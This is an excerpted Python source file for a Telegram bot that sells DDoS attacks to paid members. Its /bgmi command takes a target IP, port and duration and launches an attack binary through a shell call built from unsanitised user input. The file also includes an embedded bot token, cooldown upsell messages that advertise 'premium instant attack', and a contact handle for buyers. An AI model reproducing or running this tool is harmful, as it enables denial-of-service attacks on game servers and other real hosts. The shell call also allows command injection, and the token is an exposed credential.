...
bot = telebot.TeleBot('8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs')
...
def get_inline_keyboard():
    ...
    button1 = InlineKeyboardButton("🔰 ᑕOᑎTᗩᑕT OWᑎᑎEᖇ 🔰", url="https://t.me/+YrWcZVAVyYNmNTM1")
    button2 = InlineKeyboardButton("⭐ ᒍOIᑎ TEᒪEGᖇᗩᗰ ᑕᕼᗩᑎᑎEᒪ ⭐", url="https://t.me/+YrWcZVAVyYNmNTM1")
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 150 sec Before Running The /bgmi Command Again buy premium instant attack with zero sec dm @NEONxCHEATZ3 ."
                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./ALONE {target} {port} {time} 1000"
                subprocess.run(full_command, shell=True)
                response = f"🍀 ᗪᗪOS ᑌSEᖇ\n\n💣 ᗩTTᗩᑕK ᖴIᑎISᕼEᗪ 💣\n\nDM :- @NEONxCHEATZ3"
        else:
            response = "⚠️iᑎᐯᗩᒪIᗪ\n\n E᙭ᗩᗰᑭᒪE: /bgmi <ɪᴘ> <ᴘᴏʀᴛ>"
    else:
        response = "OᑎᒪY ᑭᗩIᗪ ᗰEᗰᗷEᖇ ᑌSE TᕼIS ᗷOT\n\n DM :- @NEONxCHEATZ3 to 🗝️"
